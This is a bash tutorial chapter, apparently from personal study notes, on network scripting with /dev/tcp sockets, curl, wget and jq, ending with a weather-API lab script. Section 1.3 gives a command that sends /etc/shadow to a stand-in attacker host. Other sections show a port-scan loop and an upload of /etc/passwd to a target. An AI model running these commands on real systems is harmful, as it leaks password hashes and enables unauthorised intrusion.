# Network Scripting: Curl, Wget, and Sockets

---
title: "Network Scripting"
parent: "[[03b_Bash_Scripting]]"
tags:
  - bash
  - networking
  - curl
  - wget
  - sockets
  - json
  - api
created: 2026-01-23
updated: 2026-01-23
difficulty: Advanced
length: Long
---

> **Executive Summary**: 
> Bash is not just for local files. It interacts with the web. Whether you are downloading malware, interacting with a REST API, or opening a raw socket to a port, Bash has the tools. This chapter covers **Curl** (the HTTP swiss army knife), **Wget** (the mirroring tool), and the native `/dev/tcp` socket interface. We also cover parsing **JSON** with `jq`, a mandatory skill for modern APIs.

---

## Table of Contents

1. [Native Networking: `/dev/tcp`](#1-native-networking-devtcp)
    - [1.1 Opening Sockets](#11-opening-a-socket)
    - [1.2 Port Scanning](#12-port-scanning)
    - [1.3 Data Exfiltration](#13-data-exfiltration)
2. [Curl: The HTTP Client](#2-curl-the-http-client)
    - [2.1 Methods and Headers](#21-methods-and-headers)
    - [2.2 Authentication and Cookies](#22-authentication-and-cookies)
    - [2.3 Uploading Files](#23-uploading-files)
3. [Wget: The Downloader](#3-wget-the-downloader)
    - [3.1 Recursive Mirroring](#31-recursive-mirroring)
    - [3.2 Resuming Downloads](#32-resuming-downloads)
4. [JSON Parsing with `jq`](#4-json-parsing-with-jq)
    - [4.1 Extracting Values](#41-extracting-values)
    - [4.2 Filtering and Mapping](#42-filtering-and-mapping)
5. [Practical Lab: The API Client](#5-practical-lab-the-api-client)
6. [Critical Analysis & Checkpoints](#6-critical-analysis--checkpoints)

---

## 1. Native Networking: `/dev/tcp`

If `nc` and `nmap` are missing, Bash can still talk to the network.

### 1.1 Opening a Socket
Bash treats `/dev/tcp/HOST/PORT` as a file.
- **Write**: `echo "GET /" > /dev/tcp/google.com/80`
- **Read**: `cat < /dev/tcp/google.com/80`
- **Both**: Use a File Descriptor (Chapter 03).

### 1.2 Port Scanning
```bash
for port in {1..1024}; do
    (echo > /dev/tcp/10.10.10.10/$port) 2>/dev/null && echo "Open: $port"
done
```

### 1.3 Data Exfiltration
Send `/etc/shadow` to attacker.
```bash
cat /etc/shadow > /dev/tcp/attacker.com/4444
```

---

## 2. Curl: The HTTP Client

### 2.1 Methods and Headers
- `curl -X POST`: Method.
- `curl -H "Content-Type: application/json"`: Header.
- `curl -d '{"key":"value"}'`: Data body.
- `curl -i`: Include response headers.

### 2.2 Authentication and Cookies
- **Basic Auth**: `curl -u user:pass URL`.
- **Cookies**:
    - Save: `curl -c cookies.txt URL`
    - Use: `curl -b cookies.txt URL`

### 2.3 Uploading Files
Multipart form upload.
```bash
curl -F "file=@/etc/passwd" http://target.com/upload.php
```

---

## 3. Wget: The Downloader

### 3.1 Recursive Mirroring
Clone a website.
```bash
wget -r -l 2 -P /tmp/mirror http://target.com
```
- `-r`: Recursive.
- `-l 2`: Depth level.
- `-P`: Prefix folder.

### 3.2 Resuming Downloads
If a 10GB download fails at 99%.
```bash
wget -c http://target.com/large.iso
```

---

## 4. JSON Parsing with `jq`

APIs return JSON. Bash is bad at JSON (`grep` fails on nesting). `jq` is the answer.

### 4.1 Extracting Values
`{"name": "Alice", "id": 10}`
```bash
echo $JSON | jq '.name'
# Output: "Alice"
```
**Raw Output**: `jq -r '.name'` (Removes quotes).

### 4.2 Filtering and Mapping
`[{"id":1, "user":"a"}, {"id":2, "user":"b"}]`
```bash
# Get all users
echo $JSON | jq -r '.[].user'
# Output:
# a
# b
```

---

## 5. Practical Lab: The API Client

**Objective**: Write a script that queries a weather API (simulated) and extracts temperature.

**Script: `weather.sh`**
```bash
#!/bin/bash

CITY=$1
API_KEY="12345"
URL="http://api.weather.com/v1"

if [[ -z "$CITY" ]]; then
    echo "Usage: $0 <city>"
    exit 1
fi

echo "Fetching weather for $CITY..."

# 1. Curl
RESPONSE=$(curl -s -H "Authorization: Bearer $API_KEY" "$URL?city=$CITY")

# 2. Check Success (Simple grep)
if [[ $RESPONSE != *"success"* ]]; then
    echo "Error fetching data."
    exit 1
fi

# 3. Parse JSON
TEMP=$(echo $RESPONSE | jq -r '.data.temperature')
DESC=$(echo $RESPONSE | jq -r '.data.description')

echo "Current Temp: $TEMP ($DESC)"
```

---

## 6. Critical Analysis & Checkpoints

### Checkpoint Questions
1.  **Q**: Why use `curl -s`?
    -   *A*: Silent mode. Hides the progress bar/speed meter, which corrupts variable assignment `VAR=$(curl...)`.
2.  **Q**: What is the difference between `curl -d` and `curl -F`?
    -   *A*: `-d` sends `application/x-www-form-urlencoded` (or raw data). `-F` sends `multipart/form-data` (used for file uploads).
3.  **Q**: Does `/dev/tcp` work in `sh`?
    -   *A*: No. It is a Bash-specific feature. It might fail on Debian if `/bin/sh` links to `dash`.

### Final Thoughts
Bash + Curl + Jq = The poor man's Postman. You can interact with almost any modern system (Cloud, Kubernetes, Web Apps) using just these three tools.

---
*End of Chapter 09*
